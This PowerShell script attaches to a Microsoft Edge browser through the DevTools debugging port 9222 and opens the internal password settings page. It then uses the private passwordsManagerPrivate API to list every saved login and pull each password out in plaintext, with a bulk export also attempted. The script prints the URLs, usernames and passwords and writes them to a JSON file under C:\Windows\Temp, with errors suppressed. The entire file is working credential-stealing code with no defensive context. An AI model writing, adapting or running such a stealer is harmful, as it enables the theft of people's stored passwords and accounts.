$ErrorActionPreference = 'SilentlyContinue'

# Navigate to edge://settings/passwords and use chrome.passwordsManagerPrivate
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).Wait()

$buf = [byte[]]::new(10485760)
$script:mid = 0

function CdpNav {
    param([string]$url)
    $script:mid++
    $m = @{ id = $script:mid; method = "Page.navigate"; params = @{ url = $url } }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

function CdpEval {
    param([string]$js)
    $script:mid++
    $m = @{ id = $script:mid; method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Navigate to password settings
$null = CdpNav "edge://settings/passwords"
Start-Sleep 15

# ═══ Get saved password list via passwordsManagerPrivate ═══
Write-Output "[*] getting password list via passwordsManagerPrivate..."
$listResp = CdpEval @'
new Promise(async (resolve) => {
  try {
    const api = chrome.passwordsManagerPrivate;
    if (!api) { resolve(JSON.stringify({error: "no passwordsManagerPrivate"})); return; }

    // Try callback pattern first
    api.getSavedPasswordList(function(entries) {
      if (chrome.runtime.lastError) {
        resolve(JSON.stringify({error: chrome.runtime.lastError.message}));
      } else {
        resolve(JSON.stringify(entries || []));
      }
    });
  } catch(e) {
    resolve(JSON.stringify({error: e.message}));
  }
})
'@
$listObj = $listResp | ConvertFrom-Json
$listVal = $listObj.result.result.value
Write-Output "[*] list result: $($listVal.Substring(0, [Math]::Min(300, [string]$listVal)))"

if (-not $listVal) {
    Write-Output "empty list, trying promise pattern..."
    $listResp2 = CdpEval @'
new Promise(async (resolve) => {
  try {
    const list = await chrome.passwordsManagerPrivate.getSavedPasswordList();
    resolve(JSON.stringify(list));
  } catch(e) {
    resolve(JSON.stringify({error: e.message}));
  }
})
'@
    $listObj2 = $listResp2 | ConvertFrom-Json
    $listVal = $listObj2.result.result.value
    Write-Output "[*] promise result: $($listVal.Substring(0, [Math]::Min(300, [string]$listVal)))"
}

$passwords = $listVal | ConvertFrom-Json
if ($passwords.error) {
    Write-Output "API error: $($passwords.error)"
    $ws.Dispose()
    exit
}

Write-Output "[+] $($passwords.Count) saved passwords"

# ═══ Extract each password using requestPlaintextPassword ═══
$allResults = [System.Collections.ArrayList]::new()
$script:mid = 100

foreach ($entry in $passwords) {
    $eid = $entry.id
    $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } elseif ($entry.url) { $entry.url } else { $entry.login } 
    if (-not $eurl) { $eurl = "unknown" }
    $euser = $entry.username

    Write-Output "[*] extracting [$eid] $eurl ($euser)..."

    # requestPlaintextPassword(id, reason, callback)
    # PlaintextReason enum values: try 0 (PROTECTION_NONE) and common values
    $getJs = @"
new Promise(async (resolve) => {
  try {
    const api = chrome.passwordsManagerPrivate;
    // Try with different signatures
    if (api.requestPlaintextPassword) {
      // Pattern 1: (id, reason, callback)
      api.requestPlaintextPassword($eid, 0, function(pw) {
        if (chrome.runtime.lastError) {
          // Try pattern 2: (id, callback)
          api.requestPlaintextPassword($eid, function(pw2) {
            if (chrome.runtime.lastError) {
              resolve(JSON.stringify({err: chrome.runtime.lastError.message}));
            } else {
              resolve(JSON.stringify({p: pw2}));
            }
          });
        } else {
          resolve(JSON.stringify({p: pw}));
        }
      });
    } else {
      resolve(JSON.stringify({err: "no requestPlaintextPassword"}));
    }
  } catch(e) {
    resolve(JSON.stringify({err: e.message}));
  }
})
"@

    $getResp = CdpEval $getJs
    $getObj = $getResp | ConvertFrom-Json
    $getVal = $getObj.result.result.value

    if ($getVal) {
        $pwData = $getVal | ConvertFrom-Json
        if ($pwData.p -ne $null) {
            [void]$allResults.Add([PSCustomObject]@{
                url = $eurl; username = $euser; password = $pwData.p
            })
            Write-Output "    PASSWORD: $($pwData.p)"
        } elseif ($pwData.err) {
            Write-Output "    error: $($pwData.err)"
            [void]$allResults.Add([PSCustomObject]@{
                url = $eurl; username = $euser; password = "<err: $($pwData.err)>"
            })
        }
    } else {
        Write-Output "    no value returned"
        # Show raw response for debugging
        Write-Output "    raw: $($getResp.Substring(0, [Math]::Min(300, $getResp.Length)))"
    }
}

# ═══ Also try exportPasswords as a bulk method ═══
Write-Output ""
Write-Output "[*] trying bulk exportPasswords..."
$exportJs = @'
new Promise(async (resolve) => {
  try {
    const api = chrome.passwordsManagerPrivate;
    if (api.exportPasswords) {
      api.exportPasswords();
      resolve("exportPasswords() called");
    } else {
      resolve("no exportPasswords method");
    }
  } catch(e) {
    resolve("export error: " + e.message);
  }
})
'@
$exportResp = CdpEval $exportJs
$exportObj = $exportResp | ConvertFrom-Json
Write-Output "export: $($exportObj.result.result.value)"

# ═══ Output results ═══
Write-Output ""
Write-Output "================================================================"
Write-Output "         ALL PASSWORDS (chrome.passwordsManagerPrivate)"
Write-Output "================================================================"
foreach ($r in $allResults) {
    Write-Output "  URL:      $($r.url)"
    Write-Output "  USERNAME: $($r.username)"
    Write-Output "  PASSWORD: $($r.password)"
    Write-Output "  ──────────────────────────────────────────────"
}

$json = $allResults | ConvertTo-Json -Depth 3
$json | Out-File "C:\Windows\Temp\ziti\passwords_manager_private.json" -Encoding utf8
Write-Output ""
Write-Output "[+] saved to C:\Windows\Temp\ziti\passwords_manager_private.json"

$ws.Dispose()
Write-Output "[+] done"